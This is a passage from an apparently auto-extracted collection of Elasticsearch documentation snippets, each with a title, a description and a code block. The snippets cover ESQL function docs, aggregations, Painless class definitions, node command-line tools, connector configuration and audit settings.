   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: Including External Markdown Files for MV_CONCAT Function Documentation
DESCRIPTION: These snippets include external markdown files containing additional documentation sections for the MV_CONCAT function.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/mv_concat.md
:::

LANGUAGE: markdown
CODE:
:::{include} ../description/mv_concat.md
:::

LANGUAGE: markdown
CODE:
:::{include} ../types/mv_concat.md
:::

LANGUAGE: markdown
CODE:
:::{include} ../examples/mv_concat.md
:::

----------------------------------------

TITLE: Describing X Coordinate Extraction Function in Elasticsearch
DESCRIPTION: This snippet provides a description of an Elasticsearch SQL function that extracts the minimum X coordinate from geometric data. It specifies that for geo_point and geo_shape types, this is equivalent to finding the minimum longitude value.

LANGUAGE: text
CODE:
**Description**

Extracts the minimum value of the `x` coordinates from the supplied geometry. If the geometry is of type `geo_point` or `geo_shape` this is equivalent to extracting the minimum `longitude` value.

----------------------------------------

TITLE: Configuring Time Series Mode Setting
DESCRIPTION: Setting to specify the mode of the index, supporting time_series or null values.

LANGUAGE: properties
CODE:
index.mode: time_series

----------------------------------------

TITLE: Apache License 2.0 Boilerplate Text
DESCRIPTION: Standard boilerplate notice text to be included when applying the Apache License to a work. This template includes placeholders for copyright year and owner information.

LANGUAGE: text
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: Defining Community ID Processor in Elasticsearch
DESCRIPTION: Example configuration for the Community ID processor in an Elasticsearch ingest pipeline. This processor computes the Community ID for network flow data without any specific configuration, relying on default ECS field mappings.

LANGUAGE: json
CODE:
{
  "description" : "...",
  "processors" : [
    {
      "community_id": {
      }
    }
  ]
}

----------------------------------------

TITLE: Result of Analyzing Japanese Numbers with Kuromoji Number Token Filter
DESCRIPTION: This snippet shows the output of analyzing the Japanese number "一〇〇〇" (1000) using the custom analyzer with the kuromoji_number token filter. The result demonstrates the conversion to the Arabic numeral "1000".

LANGUAGE: console-result
CODE:
{
  "tokens" : [ {
    "token" : "1000",
    "start_offset" : 0,
    "end_offset" : 4,
    "type" : "word",
    "position" : 0
  } ]
}

----------------------------------------

TITLE: Defining LongBuffer Class in Java NIO
DESCRIPTION: Defines the LongBuffer class with a method to get a long at a specific index. Some methods are commented out as TODOs.

LANGUAGE: Java
CODE:
class java.nio.LongBuffer {
  long get(int)
  # TODO: https:#github.com/elastic/elasticsearch/issues/79867
  # LongBuffer get(int, long[])
  # LongBuffer get(int, long[], int, int)
}

----------------------------------------

TITLE: Describing Cosine Function in Elasticsearch ESQL
DESCRIPTION: This snippet provides a brief description of the cosine function used in Elasticsearch ESQL. It explains that the function returns the cosine of an angle and includes a link to the Wikipedia page for further information on sine and cosine.

LANGUAGE: text
CODE:
Returns the [cosine](https://en.wikipedia.org/wiki/Sine_and_cosine) of an angle.

----------------------------------------

TITLE: ESQL Function Type Mapping Table
DESCRIPTION: Markdown table showing the mapping of various numeric input types (double, integer, long, unsigned_long) to their result type (double) in ESQL functions.

LANGUAGE: markdown
CODE:
| number | result |
| --- | --- |
| double | double |
| integer | double |
| long | double |
| unsigned_long | double |

----------------------------------------

TITLE: Setting Node Attribute via Command Line
DESCRIPTION: Shows how to set a custom node attribute when starting Elasticsearch from the command line.

LANGUAGE: sh
CODE:
./bin/elasticsearch -Enode.attr.size=medium

----------------------------------------

TITLE: Bypassing Version Checks
DESCRIPTION: Example of using the elasticsearch-node override-version command to bypass version compatibility checks and allow a node to start with incompatible data.

LANGUAGE: shell
CODE:
node$ ./bin/elasticsearch-node override-version

    WARNING: Elasticsearch MUST be stopped before running this tool.

This data path was last written by Elasticsearch version [x.x.x] and may no
longer be compatible with Elasticsearch version [y.y.y]. This tool will bypass
this compatibility check, allowing a version [y.y.y] node to start on this data
path, but a version [y.y.y] node may not be able to read this data or may read
it incorrectly leading to data loss.

You should not use this tool. Instead, continue to use a version [x.x.x] node
on this data path. If necessary, you can use reindex-from-remote to copy the
data from here into an older cluster.

Do you want to proceed?

Confirm [y/N] y
Successfully overwrote this node's metadata to bypass its version compatibility checks.

----------------------------------------

TITLE: Average Aggregation on Histogram Fields
DESCRIPTION: Shows how to compute weighted averages using histogram fields that contain pre-aggregated data with values and counts arrays.

LANGUAGE: console
CODE:
PUT metrics_index/_doc/1
{
  "network.name" : "net-1",
  "latency_histo" : {
      "values" : [0.1, 0.2, 0.3, 0.4, 0.5],
      "counts" : [3, 7, 23, 12, 6]
   }
}

PUT metrics_index/_doc/2
{
  "network.name" : "net-2",
  "latency_histo" : {
      "values" :  [0.1, 0.2, 0.3, 0.4, 0.5],
      "counts" : [8, 17, 8, 7, 6]
   }
}

POST /metrics_index/_search?size=0
{
  "aggs": {
    "avg_latency":
      { "avg": { "field": "latency_histo" }
    }
  }
}

LANGUAGE: console-result
CODE:
{
  ...
  "aggregations": {
    "avg_latency": {
      "value": 0.29690721649
    }
  }
}

----------------------------------------

TITLE: Generating Default Metadata File for SAML Realm in Shell
DESCRIPTION: This example demonstrates how to generate a default metadata file for a SAML realm named 'saml1' using the elasticsearch-saml-metadata command. The output file will be written to 'saml-elasticsearch-metadata.xml' by default.

LANGUAGE: shell
CODE:
bin/elasticsearch-saml-metadata --realm saml1

----------------------------------------

TITLE: For Loop Iterations in Painless
DESCRIPTION: Two equivalent syntaxes for iterating over lists in Painless scripts using for loops. Shows both the def keyword and simplified syntax.

LANGUAGE: painless
CODE:
for (def item : list) {
  // do something
}

LANGUAGE: painless
CODE:
for (item in list) {
  // do something
}

----------------------------------------

TITLE: ESQL Function Type Mapping Table
DESCRIPTION: Markdown table showing the mapping between input field types and their result types. All input types (boolean, counter_integer, date, double, integer, keyword, long, text, and unsigned_long) produce integer results.

LANGUAGE: markdown
CODE:
| field | result |
| --- | --- |
| boolean | integer |
| counter_integer | integer |
| date | integer |
| double | integer |
| integer | integer |
| keyword | integer |
| long | integer |
| text | integer |
| unsigned_long | integer |

----------------------------------------

TITLE: ESQL Type Mapping Table
DESCRIPTION: Markdown table showing the mapping of string input types (str) to their resulting types in ESQL. The table documents that both 'keyword' and 'text' input types map to 'keyword' result type.

LANGUAGE: markdown
CODE:
| str | result |
| --- | --- |
| keyword | keyword |
| text | keyword |

----------------------------------------

TITLE: Installing Elasticsearch Plugin from Generic URL
DESCRIPTION: Basic command to install an Elasticsearch plugin from a URL. The plugin name is automatically determined from its descriptor.

LANGUAGE: shell
CODE:
sudo bin/elasticsearch-plugin install [url]

----------------------------------------

TITLE: Basic Rate Aggregation Syntax
DESCRIPTION: Basic example of a rate aggregation that calculates rates for a requests field on a monthly basis.

LANGUAGE: json
CODE:
{
  "rate": {
    "unit": "month",
    "field": "requests"
  }
}

----------------------------------------

TITLE: Adding an Elasticsearch Extension to a Deployment Plan
DESCRIPTION: Demonstrates how to add a created extension to an Elasticsearch deployment plan using its EXTENSION_ID in an update deployment API call.

LANGUAGE: json
CODE:
{
    "name": "Extensions",
    "prune_orphans": false,
    "resources": {
        "elasticsearch": [
            {
                "region": "gcp-us-central1",
                "ref_id": "main-elasticsearch",
                "plan": {
                    "cluster_topology": [

                      ...

                    ],
                    "elasticsearch": {
                        "version": "8.4.3",
                        "enabled_built_in_plugins": [ ],
                      "user_bundles": [
                        {
                          "name": "custom-plugin",
                          "url": "repo://2286113333",
                          "elasticsearch_version": "8.4.3"
                        }
                      ]
                    },
                    "deployment_template": {
                        "id": "gcp-storage-optimized-v3"
                    }
                }
            }
        ]
    }
}

----------------------------------------

TITLE: Defining Elasticsearch Analysis Token Class Interface
DESCRIPTION: Specifies the interface for Token class used in Elasticsearch analysis with methods to access token properties like term, position, offsets, and type. This class is essential for text analysis and tokenization operations in Elasticsearch.

LANGUAGE: java
CODE:
class org.elasticsearch.analysis.common.AnalysisPredicateScript$Token {
  CharSequence getTerm()
  int getPosition()
  int getPositionIncrement()
  int getPositionLength()
  int getStartOffset()
  int getEndOffset()
  String getType()
  boolean isKeyword()
}

----------------------------------------

TITLE: Executing Missing Aggregation Query in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use the Missing aggregation to find documents without a price field. It sends a POST request to the /sales index with a size of 0 and defines an aggregation named 'products_without_a_price' that uses the 'missing' aggregation on the 'price' field.

LANGUAGE: console
CODE:
POST /sales/_search?size=0
{
  "aggs": {
    "products_without_a_price": {
      "missing": { "field": "price" }
    }
  }
}

----------------------------------------

TITLE: Running Elasticsearch Microbenchmark with Async Profiler
DESCRIPTION: Command to run a microbenchmark (LongKeyedBucketOrdsBenchmark) with async profiler for flame graph generation.

LANGUAGE: bash
CODE:
gradlew -p benchmarks/ run --args 'LongKeyedBucketOrdsBenchmark.multiBucket -prof "async:libPath=/home/nik9000/Downloads/async-profiler-3.0-29ee888-linux-x64/lib/libasyncProfiler.so;dir=/tmp/prof;output=flamegraph"'

----------------------------------------

TITLE: Access Denied Event Example
DESCRIPTION: Example of an access_denied audit event when an authenticated user attempts to execute an action without proper privileges.

LANGUAGE: javascript
CODE:
{"type":"audit", "timestamp":"2020-12-30T22:30:06,949+0200", "node.id":"0RMNyghkQYCc_gVd1G6tZQ", "event.type":"transport", "event.action":"access_denied", "authentication.type":"REALM", "user.name":"user1", "user.realm":"default_native", "user.roles":["test_role"], "origin.type":"rest", "origin.address":"[::1]:52434", "request.id":"yKOgWn2CRQCKYgZRz3phJw", "action":"indices:admin/auto_create", "request.name":"CreateIndexRequest", "indices":["<index-{now/d+1d}>"]}

----------------------------------------

TITLE: Describing Trim Function in Elasticsearch ESQL
DESCRIPTION: This markdown snippet describes the functionality of the trim function in Elasticsearch's ESQL. It explains that the function removes leading and trailing whitespaces from a string.

LANGUAGE: markdown
CODE:
**Description**

Removes leading and trailing whitespaces from a string.

----------------------------------------

TITLE: Running Azure Blob Storage Connector Docker Container
DESCRIPTION: Command to run the Docker container for the Azure Blob Storage connector service. This command mounts the configuration file and sets up the network for communication with Elasticsearch.

LANGUAGE: sh
CODE:
docker run \
-v ~/connectors-config:/config \
--network "elastic" \
--tty \
--rm \
docker.elastic.co/integrations/elastic-connectors:9.0.0 \
/app/bin/elastic-ingest \
-c /config/config.yml

----------------------------------------

TITLE: Character Distribution Analysis in String Stats
DESCRIPTION: Shows how to retrieve character distribution statistics by enabling the show_distribution parameter. Returns detailed probability distribution for each character in the analyzed strings.

LANGUAGE: console
CODE:
POST /my-index-000001/_search?size=0
{
  "aggs": {
    "message_stats": {
      "string_stats": {
        "field": "message.keyword",
        "show_distribution": true
      }
    }
  }
}

----------------------------------------

TITLE: Embedding COS Function Syntax Diagram in Markdown
DESCRIPTION: This snippet embeds an SVG image of the COS function syntax diagram using Markdown syntax.

LANGUAGE: markdown
CODE:
:::{image} ../../../images/functions/cos.svg
:alt: Embedded
:class: text-center
:::

----------------------------------------

TITLE: Augmenting String Class in Painless
DESCRIPTION: Extends the Java String class with additional method for conversion to integer through the example whitelisted class.

LANGUAGE: painless
CODE:
class java.lang.String {
  int org.elasticsearch.example.painlesswhitelist.ExampleWhitelistedClass toInt()
}

----------------------------------------

TITLE: Describing ST_WITHIN Geospatial Function in Elasticsearch
DESCRIPTION: This snippet provides a description of the ST_WITHIN function in Elasticsearch. It explains that the function checks if the first geometry is within the second geometry and notes that it is the inverse of the ST_CONTAINS function.

LANGUAGE: markdown
CODE:
**Description**

Returns whether the first geometry is within the second geometry. This is the inverse of the [ST_CONTAINS](/reference/query-languages/esql/esql-functions-operators.md#esql-st_contains) function.

----------------------------------------

TITLE: Including TO_TIMEDURATION Type Information Documentation
DESCRIPTION: This snippet includes the type information documentation for the TO_TIMEDURATION function from an external markdown file.

LANGUAGE: markdown
CODE:
:::{include} ../types/to_timeduration.md
:::

----------------------------------------

TITLE: HISTOGRAM Bucket Key Calculation
DESCRIPTION: Formula showing how bucket keys are calculated for the histogram function.

LANGUAGE: sql
CODE:
bucket_key = Math.floor(value / interval) * interval

----------------------------------------

TITLE: Describing TO_CARTESIAN_SHAPE Function in ESQL
DESCRIPTION: This snippet provides a description of the TO_CARTESIAN_SHAPE function in Elasticsearch SQL. It explains that the function converts input values to the cartesian_shape data type, with specific handling for Well-Known Text (WKT) format strings.

LANGUAGE: plaintext
CODE:
**Description**

Converts an input value to a `cartesian_shape` value. A string will only be successfully converted if it respects the [WKT](https://en.wikipedia.org/wiki/Well-known_text_representation_of_geometry) format.

----------------------------------------

TITLE: Running Elasticsearch Microbenchmarks with Gradle
DESCRIPTION: Command to run all microbenchmarks in the Elasticsearch project using Gradle.

LANGUAGE: bash
CODE:
gradlew -p benchmarks run

----------------------------------------

TITLE: Defining Tau Function Description for Elasticsearch
DESCRIPTION: This snippet provides the description for the tau function in Elasticsearch. It explains that the function returns the ratio of a circle's circumference to its radius, commonly known as tau (τ).

LANGUAGE: plaintext
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Description**

Returns the [ratio](https://tauday.com/tau-manifesto) of a circle's circumference to its radius.

----------------------------------------

TITLE: Including ST_ENVELOPE Function Description in Markdown
DESCRIPTION: This snippet includes the description of the ST_ENVELOPE function from an external Markdown file.

LANGUAGE: markdown
CODE:
:::{include} ../description/st_envelope.md
:::

----------------------------------------

TITLE: Elasticsearch Query to Remove Old Drive Item Content
DESCRIPTION: Elasticsearch query to remove content from drive items older than 180 days.

LANGUAGE: json
CODE:
POST INDEX_NAME/_update_by_query?conflicts=proceed
{
  "query": {
    "bool": {
      "filter": [
        {
          "match": {
            "object_type": "drive_item"
          }
        },
        {
          "exists": {
            "field": "file"
          }
        },
        {
          "range": {
            "lastModifiedDateTime": {
              "lte": "now-180d"
            }
          }
        }
      ]
    }
  },
  "script": {
    "source": "ctx._source.body = ''",
    "lang": "painless"
  }
}

----------------------------------------

TITLE: Configuring Downsample Action in ILM Policy for Elasticsearch
DESCRIPTION: This snippet demonstrates how to create an ILM policy that includes a downsample action in the hot phase. The policy rolls over the index when it reaches 1 document and then downsamples the data to hourly intervals.

LANGUAGE: console
CODE:
PUT _ilm/policy/datastream_policy
{
  "policy": {
    "phases": {
      "hot": {
        "actions": {
          "rollover": {
            "max_docs": 1
          },
          "downsample": {
  	          "fixed_interval": "1h"
  	      }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Defining ZoneRulesProvider Class Methods
DESCRIPTION: Defines the ZoneRulesProvider class which provides access to timezone rules and available zone IDs.

LANGUAGE: java
CODE:
class java.time.zone.ZoneRulesProvider {
  Set getAvailableZoneIds()
  ZoneRules getRules(String,boolean)
  NavigableMap getVersions(String)
}

----------------------------------------

TITLE: SPACE Function Documentation Template in Markdown
DESCRIPTION: Documentation template structure for the SPACE function, including placeholders for syntax diagram, parameters, description, types, and examples. Generated by ESQL's AbstractFunctionTestCase.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

## `SPACE` [esql-space]

**Syntax**

:::{image} ../../../images/functions/space.svg
:alt: Embedded
:class: text-center
:::


:::{include} ../parameters/space.md
:::

:::{include} ../description/space.md
:::

:::{include} ../types/space.md
:::

:::{include} ../examples/space.md
:::

----------------------------------------

TITLE: Enabling Slow Logs for Search Requests in Elasticsearch
DESCRIPTION: This JSON snippet demonstrates how to enable slow logs for search requests across all indices using the update indices settings API. It sets a high threshold for the 'warn' level and includes user information.

LANGUAGE: json
CODE:
PUT /*/_settings
{
  "index.search.slowlog.include.user": true,
  "index.search.slowlog.threshold.fetch.warn": "30s",
  "index.search.slowlog.threshold.query.warn": "30s"
}

----------------------------------------

TITLE: Specifying Base64 String Parameter
DESCRIPTION: Parameter documentation for base64 string input in ESQL functions. Used for testing base64 decoding operations.

LANGUAGE: markdown
CODE:
`string`
:   A base64 string.

----------------------------------------

TITLE: Post Filter with Aggregations in Elasticsearch
DESCRIPTION: Shows how to use post_filter to apply filtering after aggregations, enabling faceted navigation while maintaining broader aggregation results.

LANGUAGE: json
CODE:
GET /shirts/_search
{
  "query": {
    "bool": {
      "filter": {
        "term": { "brand": "gucci" }
      }
    }
  },
  "aggs": {
    "colors": {
      "terms": { "field": "color" }
    },
    "color_red": {
      "filter": {
        "term": { "color": "red" }
      },
      "aggs": {
        "models": {
          "terms": { "field": "model" }
        }
      }
    }
  },
  "post_filter": {
    "term": { "color": "red" }
  }
}

----------------------------------------

TITLE: Enabling _size Field in Elasticsearch Mapping
DESCRIPTION: Configuration snippet showing how to enable the _size field in an Elasticsearch index mapping.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "_size": {
      "enabled": true
    }
  }
}

----------------------------------------

TITLE: Displaying Supported Types Table in Markdown
DESCRIPTION: This markdown table shows the mapping between different field types and their result types in ESQL. All field types listed here result in the 'long' type.

LANGUAGE: markdown
CODE:
| field | result |
| --- | --- |
| boolean | long |
| cartesian_point | long |
| date | long |
| double | long |
| geo_point | long |
| integer | long |
| ip | long |
| keyword | long |
| long | long |
| text | long |
| unsigned_long | long |
| version | long |

----------------------------------------

TITLE: Installing Store SMB Plugin for Elasticsearch
DESCRIPTION: Command to install the Store SMB plugin using the Elasticsearch plugin manager. This plugin must be installed on every node in the cluster, and each node must be restarted after installation.

LANGUAGE: sh
CODE:
sudo bin/elasticsearch-plugin install store-smb

----------------------------------------

TITLE: Detaching Nodes from Their Cluster
DESCRIPTION: Example of using the elasticsearch-node detach-cluster command to detach a node from its current cluster so it can join a new one.

LANGUAGE: shell
CODE:
node_3$ ./bin/elasticsearch-node detach-cluster

    WARNING: Elasticsearch MUST be stopped before running this tool.

You should only run this tool if you have permanently lost all of the
master-eligible nodes in this cluster and you cannot restore the cluster
from a snapshot, or you have already unsafely bootstrapped a new cluster
by running `elasticsearch-node unsafe-bootstrap` on a master-eligible
node that belonged to the same cluster as this node. This tool can cause
arbitrary data loss and its use should be your last resort.

Do you want to proceed?

Confirm [y/N] y
Node was successfully detached from the cluster

----------------------------------------

TITLE: High Accuracy Boxplot Configuration
DESCRIPTION: Demonstrates setting execution_hint for higher accuracy at the cost of performance in boxplot calculations.

LANGUAGE: console
CODE:
GET latency/_search
{
  "size": 0,
  "aggs": {
    "load_time_boxplot": {
      "boxplot": {
        "field": "load_time",
        "execution_hint": "high_accuracy"
      }
    }
  }
}

----------------------------------------

TITLE: Creating Enrollment Token for Elasticsearch Node
DESCRIPTION: This example demonstrates how to create an enrollment token for enrolling an Elasticsearch node into a cluster using the -s parameter to specify the node scope.

LANGUAGE: shell
CODE:
bin/elasticsearch-create-enrollment-token -s node

----------------------------------------

TITLE: Configuring Audit Settings in Elasticsearch YAML
DESCRIPTION: Example of enabling and configuring audit settings for Elasticsearch, including event types to include and exclude.

LANGUAGE: yaml
CODE:
xpack.security.audit.enabled: true
xpack.security.audit.logfile.events.include: ["access_denied", "authentication_failed", "connection_denied"]
xpack.security.audit.logfile.events.exclude: ["system_access_granted"]
xpack.security.audit.logfile.events.emit_request_body: false

----------------------------------------

TITLE: ESQL Data Type Mappings Table
DESCRIPTION: A markdown table showing the mapping between field types and their corresponding result types in ESQL. This table documents the type system relationships for ESQL function implementations.

LANGUAGE: markdown
CODE:
| field | result |
| --- | --- |
| boolean | boolean |
| date | date |
| date_nanos | date_nanos |
| double | double |
| integer | integer |
| ip | ip |
| keyword | keyword |
| long | long |
| text | keyword |
| version | version |

----------------------------------------

TITLE: Executing Watcher with Action-Specific Condition in Elasticsearch
DESCRIPTION: This example shows a Watcher execution with an action-specific condition script. The script checks if any play has grossed over $10,000 using Java Stream API's anyMatch method.

LANGUAGE: json
CODE:
POST _watcher/watch/_execute
{
  "watch" : {
    "trigger" : { "schedule" : { "interval" : "24h" } },
    "input" : {
      "search" : {
        "request" : {
          "indices" : [ "seats" ],
          "body" : {
            "query" : {
              "term": { "sold": "true"}
            },
            "size": 0,
            "aggs" : {
              "theatres" : {
                "terms" : { "field" : "play" },
                "aggs" : {
                  "money" : {
                    "sum": {
                      "field" : "cost",
                      "script": {
                       "source": "doc.cost.value * doc.number.value"
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    },
    "actions" : {
      "my_log" : {
        "condition": {                                                <1>
          "script" :
          """
            return ctx.payload.aggregations.theatres.buckets.stream()
              .anyMatch(theatre -> theatre.money.value > 10000)       <2>
          """
        },
        "logging" : {
          "text" : "At least one play has grossed over $10,000: {{ctx.payload.aggregations.theatres.buckets}}"
        }
      }
    }
  }
}

----------------------------------------

TITLE: Runtime Field Boxplot Aggregation
DESCRIPTION: Shows how to use runtime fields with boxplot aggregation to transform values during computation. Includes script configuration for converting milliseconds to seconds.

LANGUAGE: console
CODE:
GET latency/_search
{
  "size": 0,
  "runtime_mappings": {
    "load_time.seconds": {
      "type": "long",
      "script": {
        "source": "emit(doc['load_time'].value / params.timeUnit)",
        "params": {
          "timeUnit": 1000
        }
      }
    }
  },
  "aggs": {
    "load_time_boxplot": {
      "boxplot": { "field": "load_time.seconds" }
    }
  }
}

----------------------------------------

TITLE: Defining UpdateByQueryScript Class for Elasticsearch
DESCRIPTION: Specifies the main class for update_by_query scripts, providing access to metadata and field operations.

LANGUAGE: Java
CODE:
class org.elasticsearch.script.UpdateByQueryScript {
    Metadata metadata()
    WriteField field(String)
}

----------------------------------------

TITLE: EQL Sample Query
DESCRIPTION: Example of an EQL sample query that matches unordered events sharing field values.

LANGUAGE: eql
CODE:
sample by host
  [ file where file.extension == "exe" ]
  [ process where true ]

----------------------------------------

TITLE: Using String.format for Parameterized Logging in Elasticsearch
DESCRIPTION: Recommends using java.util.Supplier<String> with String.format instead of Apache Log4j's ParameterizedMessage for parameterized logging.

LANGUAGE: java
CODE:
@defaultMessage use java.util.Supplier<String> with String.format instead of ParameterizedMessage
org.apache.logging.log4j.message.ParameterizedMessage#<init>(java.lang.String, java.lang.String[], java.lang.Throwable)
org.apache.logging.log4j.message.ParameterizedMessage#<init>(java.lang.String, java.lang.Object[], java.lang.Throwable)
org.apache.logging.log4j.message.ParameterizedMessage#<init>(java.lang.String, java.lang.Object[])
org.apache.logging.log4j.message.ParameterizedMessage#<init>(java.lang.String, java.lang.Object)
org.apache.logging.log4j.message.ParameterizedMessage#<init>(java.lang.String, java.lang.Object, java.lang.Object)

----------------------------------------

TITLE: Converting Values to Date Periods in Elasticsearch SQL
DESCRIPTION: This function test case demonstrates the conversion of various input values into date_period data type in Elasticsearch SQL. It likely includes multiple test scenarios with different input types and expected outputs.

LANGUAGE: sql
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

----------------------------------------

TITLE: Fetching Site ID with Graph API Query
DESCRIPTION: HTTP GET request to retrieve the site ID using Microsoft Graph API.

LANGUAGE: http
CODE:
GET https://graph.microsoft.com/v1.0/sites?select=webUrl,Title,Id&$search="<Name of the site>*"

----------------------------------------

TITLE: Working with Arrays in Painless
DESCRIPTION: Examples of declaring, initializing, and using single-dimensional and multi-dimensional arrays in Painless.

LANGUAGE: painless
CODE:
int[] x;
float[] y = new float[10];
def z = new float[5];
y[9] = 1.0F;
z[0] = y[9];

int[][][] ia3 = new int[2][3][4];
ia3[1][2][3] = 99;
int i = ia3[1][2][3];

----------------------------------------

TITLE: Markdown Comment for ESQL Function Documentation
DESCRIPTION: A comment indicating that this file is automatically generated by ESQL's AbstractFunctionTestCase and should not be edited manually.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

----------------------------------------

TITLE: Documenting COUNT() Function Parameters in Elasticsearch ESQL
DESCRIPTION: This snippet describes the 'field' parameter for what appears to be the COUNT() function in Elasticsearch ESQL. It explains that the field parameter is optional and, if omitted, the function behaves like COUNT(*).

LANGUAGE: markdown
CODE:
**Parameters**

`field`
:   Expression that outputs values to be counted. If omitted, equivalent to `COUNT(*)` (the number of rows).

----------------------------------------

TITLE: Including External Markdown Files for ESQL LEAST Function Documentation
DESCRIPTION: These code snippets include external markdown files containing parameters, description, supported types, and examples for the LEAST function in ESQL.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/least.md
:::

LANGUAGE: markdown
CODE:
:::{include} ../description/least.md
:::

LANGUAGE: markdown
CODE:
:::{include} ../types/least.md
:::

LANGUAGE: markdown
CODE:
:::{include} ../examples/least.md
:::

----------------------------------------

TITLE: Span Multi-Term Query with Boost in Elasticsearch
DESCRIPTION: Shows how to apply a boost to a span_multi query, specifically boosting a prefix query within the span_multi structure.

LANGUAGE: json
CODE:
GET /_search
{
  "query": {
    "span_multi": {
      "match": {
        "prefix": { "user.id": { "value": "ki", "boost": 1.08 } }
      }
    }
  }
}

----------------------------------------

TITLE: Extracting Last Element from Split String using MV_LAST in ESQL
DESCRIPTION: This snippet demonstrates how to use the MV_LAST function to retrieve the last element from a string split by semicolons. It first creates a row with a single column 'a', then uses SPLIT to divide the string and MV_LAST to extract the final element.

LANGUAGE: esql
CODE:
ROW a="foo;bar;baz"
| EVAL last_a = MV_LAST(SPLIT(a, ";"))

----------------------------------------

TITLE: SSL Certificate Verification Commands
DESCRIPTION: Utility OpenSSL commands for verifying and inspecting SSL certificates and keys. Includes commands for checking private keys, reading PKCS12 certificates, and testing SSL connections.

LANGUAGE: bash
CODE:
openssl rsa -in private-ca.key -check # check private key
openssl pkcs12 -info -in private-cert$i.p12 -nodes -nocerts # read private keys from p12
openssl pkcs12 -info -in private-cert$i.p12 -nodes -nokeys # read public keys from p12
openssl x509 -in public-cert$i.pem -text # decode PEM formatted public key
openssl s_client -showcerts -connect localhost:9200 </dev/null # show cert from URL

----------------------------------------

TITLE: Truncating Dates with DATE_TRUNC Function in ESQL
DESCRIPTION: This example shows how to use the DATE_TRUNC function with a time span to truncate hire dates to the year level.

LANGUAGE: esql
CODE:
FROM employees
| KEEP first_name, last_name, hire_date
| EVAL year_hired = DATE_TRUNC(1 year, hire_date)

----------------------------------------

TITLE: Handling Deprecated Parameters in Java for REST API Compatibility
DESCRIPTION: Example of handling deprecated parameters and emitting warnings when processing requests with REST API compatibility.

LANGUAGE: java
CODE:
if (request.getRestApiVersion() == RestApiVersion.V_7 && request.hasParam("limit")) {
    deprecationLogger.compatibleCritical("limit_parameter_deprecation",
                      "Deprecated parameter [limit] used, replaced by [maximum and minimum]");
    setMax(request.param("limit"));
}

----------------------------------------

TITLE: Displaying ST_ENVELOPE Function Syntax Diagram in Markdown
DESCRIPTION: This snippet embeds an SVG image showing the syntax diagram for the ST_ENVELOPE function in Elasticsearch's ESQL.

LANGUAGE: markdown
CODE:
:::{image} ../../../images/functions/st_envelope.svg
:alt: Embedded
:class: text-center
:::

----------------------------------------

TITLE: Configuring Elasticsearch Connector Settings
DESCRIPTION: YAML configuration example for setting up Elasticsearch connector with host, API key and connector details for Docker deployment.

LANGUAGE: yaml
CODE:
# When connecting to your cloud deployment you should edit the host value
elasticsearch.host: http://host.docker.internal:9200
elasticsearch.api_key: <ELASTICSEARCH_API_KEY>

connectors:
  -
    connector_id: <CONNECTOR_ID_FROM_KIBANA>
    service_type: sharepoint_online # Example value — update this for service type you are connecting to
    api_key: <CONNECTOR_API_KEY_FROM_KIBANA> # Optional. If not provided, the connector will use the elasticsearch.api_key instead

----------------------------------------

TITLE: Using Wildcard in SELECT Statement
DESCRIPTION: Shows how to use the wildcard (*) to select all columns from a table in Elasticsearch SQL.

LANGUAGE: sql
CODE:
SELECT * FROM emp LIMIT 1;

----------------------------------------

TITLE: Using Wildcard in SELECT Statement
DESCRIPTION: Shows how to use the wildcard (*) to select all columns from a table in Elasticsearch SQL.

LANGUAGE: sql
CODE:
SELECT * FROM emp LIMIT 1;

----------------------------------------

TITLE: Including CBRT Function Documentation Sections in Markdown
DESCRIPTION: This snippet demonstrates the use of Markdown include directives to compose the documentation for the CBRT function in Elasticsearch SQL. It includes separate files for parameters, description, types, and examples.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/cbrt.md
:::

:::{include} ../description/cbrt.md
:::

:::{include} ../types/cbrt.md
:::

:::{include} ../examples/cbrt.md
:::

----------------------------------------

TITLE: Defining ESQL Function Parameters in Markdown
DESCRIPTION: Documents parameters for an ESQL function, specifically defining the 'field' parameter as accepting single or multi-valued inputs.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Parameters**

`field`
:   Input value. The input can be a single- or multi-valued column or an expression.

----------------------------------------

TITLE: Including TO_LONG Function Description in Markdown
DESCRIPTION: This snippet includes the markdown file containing the description of the TO_LONG function.

LANGUAGE: markdown
CODE:
:::{include} ../description/to_long.md
:::

----------------------------------------

TITLE: Parameter Documentation in Markdown
DESCRIPTION: Documents a numeric parameter for an ESQL function. Specifies that the function accepts a numeric expression and returns null if the input is null.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Parameters**

`number`
:   Numeric expression. If `null`, the function returns `null`.

----------------------------------------

TITLE: Configuring Index-Level Coercion Settings in Elasticsearch
DESCRIPTION: This snippet shows how to disable coercion at the index level while enabling it for a specific field. It demonstrates the hierarchy of coercion settings and their effects on data insertion.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "settings": {
